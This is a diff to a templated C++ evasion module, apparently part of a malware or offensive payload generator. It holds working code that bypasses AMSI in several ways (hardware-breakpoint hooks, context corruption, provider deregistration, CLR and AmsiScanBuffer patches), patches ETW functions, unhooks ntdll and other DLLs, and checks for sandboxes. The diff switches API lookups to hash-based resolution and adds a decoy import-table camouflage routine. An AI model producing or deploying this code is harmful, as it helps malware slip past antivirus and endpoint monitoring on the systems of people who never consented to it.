@@ -14,7 +14,7 @@ static void evasion_sleep(uint32_t seconds) {
     interval.QuadPart = -static_cast<LONGLONG>(seconds) * 10000000LL;
     auto fn = get_syscall_fn<NtDelayExecution_t>(HASH_NtDelayExecution);
     if (fn) fn(FALSE, &interval);
-    else Sleep(seconds * 1000);
+    else sleep_ms(seconds * 1000);
 }
 {{#ENDIF}}
 
@@ -85,10 +85,10 @@ static bool check_memory() {
 static bool check_domain() {
     // Check if machine is domain-joined
     using NetGetJoinInfo_t = DWORD(WINAPI*)(LPCWSTR, LPWSTR*, int*);
-    HMODULE hNet = LoadLibraryW(obf_wide(L"netapi32.dll"));
+    HMODULE hNet = load_module(L"netapi32.dll");
     if (!hNet) return true;
     auto pNetGetJoinInformation = reinterpret_cast<NetGetJoinInfo_t>(
-        GetProcAddress(hNet, obf("NetGetJoinInformation")));
+        resolve_function(hNet, HASHA("NetGetJoinInformation")));
     if (!pNetGetJoinInformation) return true;
 
     LPWSTR buf = NULL;
@@ -99,7 +99,7 @@ static bool check_domain() {
     if (buf) {
         using NetApiFree_t = DWORD(WINAPI*)(LPVOID);
         auto pFree = reinterpret_cast<NetApiFree_t>(
-            GetProcAddress(hNet, obf("NetApiBufferFree")));
+            resolve_function(hNet, HASHA("NetApiBufferFree")));
         if (pFree) pFree(buf);
     }
     FreeLibrary(hNet);
@@ -166,16 +166,16 @@ static LONG CALLBACK amsi_hwbp_handler(PEXCEPTION_POINTERS exc) {
 }
 
 static void bypass_amsi_hwbp() {
-    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
+    HMODULE hAmsi = load_module(L"amsi.dll");
     if (!hAmsi) return;
 
-    g_amsi_target_addr = reinterpret_cast<void*>(GetProcAddress(hAmsi, obf("AmsiScanBuffer")));
+    g_amsi_target_addr = reinterpret_cast<void*>(resolve_function(hAmsi, HASHA("AmsiScanBuffer")));
     if (!g_amsi_target_addr) return;
 
     using AddVEH_t = PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER);
     auto pAddVEH = reinterpret_cast<AddVEH_t>(
-        GetProcAddress(GetModuleHandleW(obf_wide(L"kernel32.dll")),
-                       obf("AddVectoredExceptionHandler")));
+        resolve_function(resolve_module(HASHA("KERNEL32.DLL")),
+                         HASHA("AddVectoredExceptionHandler")));
     if (!pAddVEH) return;
     g_amsi_veh = pAddVEH(1, amsi_hwbp_handler);
 
@@ -203,11 +203,11 @@ static void bypass_amsi_hwbp() {
 // Corrupt the AMSI context signature (4 bytes on heap, not code)
 static void bypass_amsi_context_corrupt() {
     using AmsiInitialize_t = HRESULT(WINAPI*)(LPCWSTR, PVOID*);
-    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
+    HMODULE hAmsi = load_module(L"amsi.dll");
     if (!hAmsi) return;
 
     auto pInit = reinterpret_cast<AmsiInitialize_t>(
-        GetProcAddress(hAmsi, obf("AmsiInitialize")));
+        resolve_function(hAmsi, HASHA("AmsiInitialize")));
     if (!pInit) return;
 
     PVOID ctx = nullptr;
@@ -224,14 +224,14 @@ static void bypass_amsi_context_corrupt() {
 {{#IF AMSI_PROVIDER_DEREGISTER}}
 // AMSI Provider Deregistration - @RastaMouse, @KorKos
 static void bypass_amsi_provider_deregister() {
-    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
+    HMODULE hAmsi = load_module(L"amsi.dll");
     if (!hAmsi) return;
 
     // Get AmsiUacInitialize to force provider enumeration, then
     // patch each provider's scan vtable entry
     using AmsiInitialize_t = HRESULT(WINAPI*)(LPCWSTR, PVOID*);
     auto pInit = reinterpret_cast<AmsiInitialize_t>(
-        GetProcAddress(hAmsi, obf("AmsiInitialize")));
+        resolve_function(hAmsi, HASHA("AmsiInitialize")));
     if (!pInit) return;
 
     PVOID ctx = nullptr;
@@ -279,8 +279,8 @@ static NTSTATUS NTAPI hooked_NtCreateSection(
 // CLR-level AMSI bypass - patch CLR's internal AmsiScan wrapper
 static void bypass_amsi_clr_patch() {
     // clr.dll or coreclr.dll contains the AMSI wrapper
-    HMODULE hClr = GetModuleHandleW(obf_wide(L"clr.dll"));
-    if (!hClr) hClr = GetModuleHandleW(obf_wide(L"coreclr.dll"));
+    HMODULE hClr = resolve_module(HASHA("CLR.DLL"));
+    if (!hClr) hClr = resolve_module(HASHA("CORECLR.DLL"));
     if (!hClr) return;
 
     // Pattern scan for the AmsiScan call site in CLR
@@ -311,10 +311,10 @@ static void bypass_amsi_clr_patch() {
 {{#IF AMSI_PATCH}}
 // Classic AmsiScanBuffer patch (fallback) via syscalls
 static void bypass_amsi_patch() {
-    HMODULE hAmsi = LoadLibraryW(obf_wide(L"amsi.dll"));
+    HMODULE hAmsi = load_module(L"amsi.dll");
     if (!hAmsi) return;
 
-    void* addr = reinterpret_cast<void*>(GetProcAddress(hAmsi, obf("AmsiScanBuffer")));
+    void* addr = reinterpret_cast<void*>(resolve_function(hAmsi, HASHA("AmsiScanBuffer")));
     if (!addr) return;
 
     // xor eax, eax; ret - returns S_OK with AMSI_RESULT_CLEAN
@@ -361,16 +361,16 @@ static LONG CALLBACK etw_hwbp_handler(PEXCEPTION_POINTERS exc) {
 }
 
 static void bypass_etw_hwbp() {
-    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    HMODULE hNtdll = resolve_module(HASHA("NTDLL.DLL"));
     if (!hNtdll) return;
 
-    g_etw_target_addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("EtwEventWrite")));
+    g_etw_target_addr = reinterpret_cast<void*>(resolve_function(hNtdll, HASHA("EtwEventWrite")));
     if (!g_etw_target_addr) return;
 
     using AddVEH_t = PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER);
     auto pAddVEH = reinterpret_cast<AddVEH_t>(
-        GetProcAddress(GetModuleHandleW(obf_wide(L"kernel32.dll")),
-                       obf("AddVectoredExceptionHandler")));
+        resolve_function(resolve_module(HASHA("KERNEL32.DLL")),
+                         HASHA("AddVectoredExceptionHandler")));
     if (!pAddVEH) return;
     g_etw_veh = pAddVEH(1, etw_hwbp_handler);
 
@@ -405,10 +405,10 @@ static void bypass_etw_complus() {
 static void bypass_etw_provider_disable() {
     // Disable .NET runtime ETW provider
     using EventUnregister_t = ULONG(WINAPI*)(REGHANDLE);
-    HMODULE hAdvapi = LoadLibraryW(obf_wide(L"advapi32.dll"));
+    HMODULE hAdvapi = load_module(L"advapi32.dll");
     if (!hAdvapi) return;
     auto pEventUnregister = reinterpret_cast<EventUnregister_t>(
-        GetProcAddress(hAdvapi, obf("EventUnregister")));
+        resolve_function(hAdvapi, HASHA("EventUnregister")));
     if (!pEventUnregister) return;
 
     // Attempt to unregister common ETW providers
@@ -421,7 +421,7 @@ static void bypass_etw_provider_disable() {
 {{#IF ETW_UNHOOK_NTDLL}}
 // Fresh ntdll unhooking - @_RastaMouse, @MDSec
 static void bypass_etw_unhook_ntdll() {
-    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    HMODULE hNtdll = resolve_module(HASHA("NTDLL.DLL"));
     if (!hNtdll) return;
 
     // Map clean ntdll from disk
@@ -468,10 +468,10 @@ static void bypass_etw_unhook_ntdll() {
 {{#IF ETW_PATCH_ETWWRITE}}
 // Patch EtwEventWrite to ret
 static void bypass_etw_patch_etwwrite() {
-    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    HMODULE hNtdll = resolve_module(HASHA("NTDLL.DLL"));
     if (!hNtdll) return;
 
-    void* addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("EtwEventWrite")));
+    void* addr = reinterpret_cast<void*>(resolve_function(hNtdll, HASHA("EtwEventWrite")));
     if (!addr) return;
 
     uint8_t patch = 0xC3; // ret
@@ -491,10 +491,10 @@ static void bypass_etw_patch_etwwrite() {
 {{#IF ETW_PATCH_NTTRACE}}
 // Patch NtTraceEvent
 static void bypass_etw_patch_nttrace() {
-    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    HMODULE hNtdll = resolve_module(HASHA("NTDLL.DLL"));
     if (!hNtdll) return;
 
-    void* addr = reinterpret_cast<void*>(GetProcAddress(hNtdll, obf("NtTraceEvent")));
+    void* addr = reinterpret_cast<void*>(resolve_function(hNtdll, HASHA("NtTraceEvent")));
     if (!addr) return;
 
     // xor eax, eax; ret (return STATUS_SUCCESS)
@@ -517,7 +517,7 @@ static void bypass_etw_patch_nttrace() {
 static void bypass_etw_callback_remove() {
     // Walk the EtwpNotificationTable and NULL function pointers
     // This requires finding the internal table via pattern scanning ntdll
-    HMODULE hNtdll = GetModuleHandleW(obf_wide(L"ntdll.dll"));
+    HMODULE hNtdll = resolve_module(HASHA("NTDLL.DLL"));
     if (!hNtdll) return;
 
     // Pattern scan for EtwpNotificationTable reference in EtwEventRegister
@@ -552,7 +552,7 @@ static void bypass_etw_callback_remove() {
 // ==================== DLL UNHOOKING ====================
 {{#IF UNHOOK_DLLS}}
 static void unhook_dll(const wchar_t* dll_name) {
-    HMODULE hMod = GetModuleHandleW(dll_name);
+    HMODULE hMod = resolve_module_w(dll_name);
     if (!hMod) return;
 
     wchar_t path[MAX_PATH];
@@ -594,8 +594,39 @@ static void unhook_dll(const wchar_t* dll_name) {
 }
 {{#ENDIF}}
 
+// ==================== IAT CAMOUFLAGE ====================
+{{#IF IAT_CAMOUFLAGE}}
+static void __attribute__((noinline)) iat_camouflage() {
+    ULONG_PTR uAddr = reinterpret_cast<ULONG_PTR>(
+        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100));
+    if (!uAddr) return;
+
+    int gate = 0;
+    asm volatile("" : "+r"(gate));
+    if (gate) {
+        RegCloseKey(NULL);
+        RegDeleteKeyExA(NULL, NULL, NULL, NULL);
+        RegDeleteKeyExW(NULL, NULL, NULL, NULL);
+        RegEnumKeyExA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        RegEnumValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        RegGetValueA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        RegisterServiceCtrlHandlerA(NULL, NULL);
+        RegisterServiceCtrlHandlerW(NULL, NULL);
+    }
+
+    HeapFree(GetProcessHeap(), 0, reinterpret_cast<LPVOID>(uAddr));
+}
+{{#ENDIF}}
+
 // ==================== MASTER EVASION INIT ====================
 static bool evasion_init() {
+{{#IF IAT_CAMOUFLAGE}}
+    iat_camouflage();
+{{#ENDIF}}
+
 {{#IF SLEEP}}
     evasion_sleep({{SLEEP_SECONDS}});
 {{#ENDIF}}
